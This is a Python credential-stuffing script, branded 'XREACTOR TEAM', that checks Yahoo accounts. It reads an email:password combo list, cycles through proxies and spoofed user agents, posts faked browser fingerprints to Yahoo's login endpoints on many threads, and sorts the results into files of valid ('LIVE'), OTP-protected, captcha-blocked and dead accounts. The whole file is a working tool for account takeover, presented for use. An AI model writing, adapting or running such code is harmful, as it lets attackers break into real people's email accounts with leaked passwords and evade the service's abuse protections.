import concurrent.futures
import requests, re, os,time, random
from datetime import datetime
from random import randint
from colorama import Fore, Back, Style 
checked, live, die, unknown = 0, 0, 0, 0

def ua():
    uastrings = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHMTL, like Gecko) Chrome/38.0.2125.111 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
                "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
                ]
 
    return random.choice(uastrings)






def login(email, password, total, proxy):
	global checked, live, die, unknown
	now = datetime.now()
	date = now.strftime("%d/%m/%Y %H:%M:%S")

	try:
		proxies = {
			 "http": f"http://{proxy}",
			 "https": f"http://{proxy}",
		}

		sess = requests.session()
		headers = { "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		            "Accept-Encoding":"gzip, deflate, br",
		            "Accept-Language":"en-US,en;q=0.9,fa;q=0.8",
		            "Referer":"https://www.google.com/",
		            "User-Agent":ua(),
		}


		getToken = sess.get('https://login.yahoo.com/', headers=headers)
		acrumb = re.search('name="acrumb" value="(.*?)"', getToken.text).group(1)
		crumb = re.search('name="crumb" value="(.*?)"', getToken.text).group(1)
		sessIndex = re.search('name="sessionIndex" value="(.*?)"', getToken.text).group(1)

		data = {
		  'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":2,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":300,"timezone":"America/Chicago","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Linux x86_64","doNotTrack":"unknown","plugins":{"count":3,"hash":"8a96909f149b8498acd12195c703e1d2"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~ANGLE (Intel Open Source Technology Center, Mesa DRI Intel(R) HD Graphics 400 (BSW), OpenGL 4.6 core)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":8,"hash":"58c209688943c93bad7986240ff82ede"},"audio":"124.04347730590962","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"735","h":"1366"},"ts":{"serve":1604125706190,"render":1604125709531}}',
		  'crumb': crumb,
		  'acrumb': acrumb,
		  'sessionIndex': sessIndex,
		  'displayName': '',
		  'username': email,
		  'passwd': '',
		  'signin': 'Next',
		  'persistent': 'y'
		}


		headers = { 
		"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
		          "Accept":"*/*",
		          "Accept-Encoding":"gzip, deflate, br",
		          "Accept-Language":"en-US,en;q=0.9,fa;q=0.8",
		          "Origin":"https://login.yahoo.com",
		          "Referer":"https://login.yahoo.com/",
		          "User-Agent":ua(),
		          "X-Requested-With":"XMLHttpRequest",
		          }

		response = sess.post('https://login.yahoo.com/', headers=headers, data=data, proxies=proxies, timeout=20)
		checked += 1
		if "Sorry, we don't recognize this email" in response.text:
			die += 1 
			with open('DIE.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
			with open('Proxynih.txt', 'a+') as save:
					save.write(f"{proxy}\n")
			print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ DIE ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

		else:
			reff = re.search('"location":"(.*?)"', response.text).group(1)
		if "recaptcha" in reff:
			die += 1
			with open('CAPTCHA.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
			print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ CAPTCHA ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

		elif "password" in reff:
			headers = {
			    'User-Agent': ua(),
			    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			    'Accept-Language': 'en-US,en;q=0.5',
			    'Referer': reff,
			    'Content-Type': 'application/x-www-form-urlencoded',
			    'Origin': 'https://login.yahoo.com',
			}

			data = {
			  'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":"unknown","pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-60,"timezone":"Europe/Berlin","sessionStorage":1,"localStorage":1,"indexedDb":1,"cpuClass":"unknown","platform":"Linux x86_64","doNotTrack":"1","plugins":{"count":0,"hash":"24700f9f1986800ab4fcc880530dd0ed"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Intel Open Source Technology Center~Mesa DRI Intel(R) HD Graphics 400 (BSW)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":17,"hash":"09e7f915aba90645eb652deec1d9c0c5"},"audio":"35.73833402246237","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"743","h":"1366"},"ts":{"serve":1607946635921,"render":1607946636707}}',
			  'crumb': crumb,
			  'acrumb': acrumb,
			  'sessionIndex': sessIndex,
			  'displayName': '',
			  'username': email,
			  'passwordContext': 'normal',
			  'password': password,
			  'verifyPassword': 'Next'
			}

			response = sess.post('https://login.yahoo.com/account/challenge/password', headers=headers, data=data, proxies=proxies, timeout=20)

			if "Invalid password. Please try again" in response.text:
				die += 1
				with open('DIE.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
				print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ DIE ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

			elif "Sign out" in response.text:
				live += 1
				with open('LIVE.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
				print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.GREEN}[ LIVE ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

			elif "recaptcha" in response.text:
				die += 1
				with open('CAPTCHA.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
				print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ CAPTCHA ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

			elif "First time signing in with this device" in response.text:
				live += 1
				with open('OTP.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
				print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.GREEN}[ LIVE ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

			else:
				unknown += 1
				with open('UNKNOWN.txt', 'a+') as save:
					save.write(f"{email}|{password}\n")
				print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ DIE ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")


		else:
			unknown += 1
			with open('UNKNOWN.txt', 'a+') as save:
				save.write(f"{email}|{password}\n")
			print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.YELLOW}[ UNKNOWN ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")

	except requests.exceptions.ProxyError:
		checked += 1
		die += 1
		with open('PROXY_BAD.txt', 'a+') as save:
			save.write(f"{email}|{password}\n")
		print(f"{Fore.WHITE} [ XREACTOR TEAM ] - [ {checked} / {total} ] {Fore.RED}[ PROXY ERROR ] {Fore.GREEN}[ {live} ] {Fore.RED}[ {die} ] {Fore.YELLOW}[ {unknown} ] {Fore.BLUE}{email}:{password} - [ {proxy} ] - {Fore.YELLOW} {date} ")
	except:
		checked += 1
		unknown += 1
		pass


if __name__ == '__main__':
	os.system('clear')
	print("""
__  __                    _               _                       
\ \/ /_ __ ___  __ _  ___| |_ ___  _ __  | |_ ___  __ _ _ __ ___  
 \  /| '__/ _ \/ _` |/ __| __/ _ \| '__| | __/ _ \/ _` | '_ ` _ \ 
 /  \| | |  __/ (_| | (__| || (_) | |    | ||  __/ (_| | | | | | |
/_/\_\_|  \___|\__,_|\___|\__\___/|_|     \__\___|\__,_|_| |_| |_|
                                                                  
ft dev http://artemisid.pw
	""")
	time.sleep(5)
	try:
		combos = input('[ ? ] Combos list : ')
	except:
		print('PLEASE CHECK AGAIN!')
	thread = input('[ ? ] Bots : ')
	proxy = input('[ ? ] Proxy List : ')
	ready = open(combos, 'r').read().splitlines()
	finished = set(ready)
	total = len(finished)

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(thread)) as executor:
		for data in finished:
			prox = random.choice(open(proxy, 'r+').read().splitlines())
			email, password = data.split(':')
			executor.submit(login, email, password, total, prox)
